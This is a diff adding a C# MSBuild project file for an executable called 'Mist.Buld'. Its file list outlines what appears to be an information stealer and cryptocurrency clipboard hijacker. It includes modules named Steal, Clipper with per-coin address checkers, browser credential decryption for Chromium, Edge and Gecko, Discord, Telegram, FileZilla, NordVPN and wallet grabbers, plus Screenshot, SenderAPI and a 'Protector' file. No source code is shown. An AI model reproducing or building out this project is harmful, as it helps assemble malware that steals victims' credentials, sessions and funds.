@@ -1,0 +1,180 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="15.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <Import Project="$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props" Condition="Exists('$(MSBuildExtensionsPath)\$(MSBuildToolsVersion)\Microsoft.Common.props')" />
+  <PropertyGroup>
+    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
+    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
+    <ProjectGuid>{013F0A65-725C-460E-99F8-75F30C24AEBE}</ProjectGuid>
+    <OutputType>WinExe</OutputType>
+    <RootNamespace>Mist.Buld</RootNamespace>
+    <AssemblyName>Mist.Buld</AssemblyName>
+    <TargetFrameworkVersion>v4.0</TargetFrameworkVersion>
+    <FileAlignment>512</FileAlignment>
+    <ProjectTypeGuids>{60DC8134-EBA5-43B8-BCC9-BB4BC16C2548};{FAE04EC0-301F-11D3-BF4B-00C04F79EFBC}</ProjectTypeGuids>
+    <ApplicationManifest>app.manifest</ApplicationManifest>
+    <StartupObject>Mist.Program</StartupObject>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugSymbols>true</DebugSymbols>
+    <DebugType>full</DebugType>
+    <Optimize>false</Optimize>
+    <OutputPath>bin\Debug\</OutputPath>
+    <DefineConstants>DEBUG;TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
+    <PlatformTarget>AnyCPU</PlatformTarget>
+    <DebugType>pdbonly</DebugType>
+    <Optimize>true</Optimize>
+    <OutputPath>bin\Release\</OutputPath>
+    <DefineConstants>TRACE</DefineConstants>
+    <ErrorReport>prompt</ErrorReport>
+    <WarningLevel>4</WarningLevel>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+  </PropertyGroup>
+  <ItemGroup>
+    <Reference Include="DotNetZip" />
+    <Reference Include="Microsoft.VisualBasic" />
+    <Reference Include="PresentationCore" />
+    <Reference Include="System" />
+    <Reference Include="System.Core" />
+    <Reference Include="System.Data" />
+    <Reference Include="System.Drawing" />
+    <Reference Include="System.Management" />
+    <Reference Include="System.Security" />
+    <Reference Include="System.Windows.Forms" />
+    <Reference Include="System.Xml" />
+  </ItemGroup>
+  <ItemGroup>
+    <AppDesigner Include="Properties\" />
+  </ItemGroup>
+  <ItemGroup>
+    <Compile Include="-Module-.cs" />
+    <Compile Include="198-Protector-V2.cs" />
+    <Compile Include="Mist\AeadParameters.cs" />
+    <Compile Include="Mist\AesFastEngine.cs" />
+    <Compile Include="Mist\AesGcm256.cs" />
+    <Compile Include="Mist\Armory.cs" />
+    <Compile Include="Mist\Arrays.cs" />
+    <Compile Include="Mist\AtomicWallet.cs" />
+    <Compile Include="Mist\BitcoinCore.cs" />
+    <Compile Include="Mist\BuffBoard.cs" />
+    <Compile Include="Mist\Bytecoin.cs" />
+    <Compile Include="Mist\Chromium.cs" />
+    <Compile Include="Mist\Clean.cs" />
+    <Compile Include="Mist\ClipboardNative.cs" />
+    <Compile Include="Mist\Clipper\Bitcoin.cs" />
+    <Compile Include="Mist\Clipper\CheckBTC.cs" />
+    <Compile Include="Mist\Clipper\CheckEth.cs" />
+    <Compile Include="Mist\Clipper\CheckLTC.cs" />
+    <Compile Include="Mist\Clipper\CheckXMR.cs" />
+    <Compile Include="Mist\Clipper\Checkzec.cs" />
+    <Compile Include="Mist\Clipper\Clipper.cs" />
+    <Compile Include="Mist\Clipper\Config.cs" />
+    <Compile Include="Mist\Clipper\Doge.cs" />
+    <Compile Include="Mist\Clipper\Etherium.cs" />
+    <Compile Include="Mist\Clipper\LiteCoin.cs" />
+    <Compile Include="Mist\Clipper\Monero.cs" />
+    <Compile Include="Mist\Clipper\RegistryControl.cs" />
+    <Compile Include="Mist\Clipper\zec.cs" />
+    <Compile Include="Mist\CNT.cs" />
+    <Compile Include="Mist\Collection.cs" />
+    <Compile Include="Mist\CryptoException.cs" />
+    <Compile Include="Mist\DashCore.cs" />
+    <Compile Include="Mist\DataLengthException.cs" />
+    <Compile Include="Mist\Decrypt.cs" />
+    <Compile Include="Mist\DecryptAPI.cs" />
+    <Compile Include="Mist\DesktopWriter.cs" />
+    <Compile Include="Mist\Discord.cs" />
+    <Compile Include="Mist\DomainDetect.cs" />
+    <Compile Include="Mist\Edge.cs" />
+    <Compile Include="Mist\Electrum.cs" />
+    <Compile Include="Mist\Ethereum.cs" />
+    <Compile Include="Mist\Exodus.cs" />
+    <Compile Include="Mist\FF.cs" />
+    <Compile Include="Mist\Files.cs" />
+    <Compile Include="Mist\FileZilla.cs" />
+    <Compile Include="Mist\GcmBlockCipher.cs" />
+    <Compile Include="Mist\GcmUtilities.cs" />
+    <Compile Include="Mist\Gecko1.cs" />
+    <Compile Include="Mist\Gecko2.cs" />
+    <Compile Include="Mist\Gecko3.cs" />
+    <Compile Include="Mist\Gecko4.cs" />
+    <Compile Include="Mist\Gecko5.cs" />
+    <Compile Include="Mist\Gecko6.cs" />
+    <Compile Include="Mist\Gecko7.cs" />
+    <Compile Include="Mist\Gecko8.cs" />
+    <Compile Include="Mist\Gecko9.cs" />
+    <Compile Include="Mist\GenString.cs" />
+    <Compile Include="Mist\GetFiles.cs" />
+    <Compile Include="Mist\Help.cs" />
+    <Compile Include="Mist\IAeadBlockCipher.cs" />
+    <Compile Include="Mist\IBlockCipher.cs" />
+    <Compile Include="Mist\ICipherParameters.cs" />
+    <Compile Include="Mist\IFolders.cs" />
+    <Compile Include="Mist\IGcmMultiplier.cs" />
+    <Compile Include="Mist\Index.cs" />
+    <Compile Include="Mist\InvalidCipherTextException.cs" />
+    <Compile Include="Mist\IsNullExtension.cs" />
+    <Compile Include="Mist\JavaScriptReader.cs" />
+    <Compile Include="Mist\Jaxx.cs" />
+    <Compile Include="Mist\JsonArray.cs" />
+    <Compile Include="Mist\JsonExt.cs" />
+    <Compile Include="Mist\JsonObject.cs" />
+    <Compile Include="Mist\JsonPrimitive.cs" />
+    <Compile Include="Mist\JsonType.cs" />
+    <Compile Include="Mist\JsonValue.cs" />
+    <Compile Include="Mist\KeyParameter.cs" />
+    <Compile Include="Mist\LitecoinCore.cs" />
+    <Compile Include="Mist\Monero.cs" />
+    <Compile Include="Mist\NativeMethods.cs" />
+    <Compile Include="Mist\NordVPN.cs" />
+    <Compile Include="Mist\Pack.cs" />
+    <Compile Include="Mist\ParametersWithIV.cs" />
+    <Compile Include="Mist\PassData.cs" />
+    <Compile Include="Mist\Pidgin.cs" />
+    <Compile Include="Mist\Program.cs" />
+    <Compile Include="Mist\Properties\Resources.cs" />
+    <Compile Include="Mist\Properties\Settings.Designer.cs">
+      <DependentUpon>Settings.settings</DependentUpon>
+      <AutoGen>True</AutoGen>
+      <DesignTimeSharedInput>True</DesignTimeSharedInput>
+    </Compile>
+    <Compile Include="Mist\Psi.cs" />
+    <Compile Include="Mist\ROW.cs" />
+    <Compile Include="Mist\RunChecker.cs" />
+    <Compile Include="Mist\Screenshot.cs" />
+    <Compile Include="Mist\SenderAPI.cs" />
+    <Compile Include="Mist\SqlHandler.cs" />
+    <Compile Include="Mist\Startjabbers.cs" />
+    <Compile Include="Mist\Steal.cs" />
+    <Compile Include="Mist\StringExtension.cs" />
+    <Compile Include="Mist\Systemsinfo.cs" />
+    <Compile Include="Mist\SZ.cs" />
+    <Compile Include="Mist\Tables8kGcmMultiplier.cs" />
+    <Compile Include="Mist\Telegram.cs" />
+    <Compile Include="Mist\TotalCommander.cs" />
+    <Compile Include="Mist\VaultCli.cs" />
+    <Compile Include="Mist\Wallets.cs" />
+    <Compile Include="Mist\WinKey.cs" />
+    <Compile Include="Mist\Zcash.cs" />
+    <Compile Include="Properties\AssemblyInfo.cs" />
+    <Compile Include="RunCheck.cs" />
+    <Compile Include="System\Net\SecurityProtocolTypeExtensions.cs" />
+    <Compile Include="System\Security\Authentication\SslProtocolsExtensions.cs" />
+  </ItemGroup>
+  <ItemGroup>
+    <EmbeddedResource Include="Mist\Properties\Resources.resources" />
+  </ItemGroup>
+  <ItemGroup>
+    <None Include="app.manifest" />
+    <None Include="Mist\Properties\Settings.settings">
+      <Generator>SettingsSingleFileGenerator</Generator>
+      <LastGenOutput>Settings.Designer.cs</LastGenOutput>
+    </None>
+  </ItemGroup>
+  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+</Project>
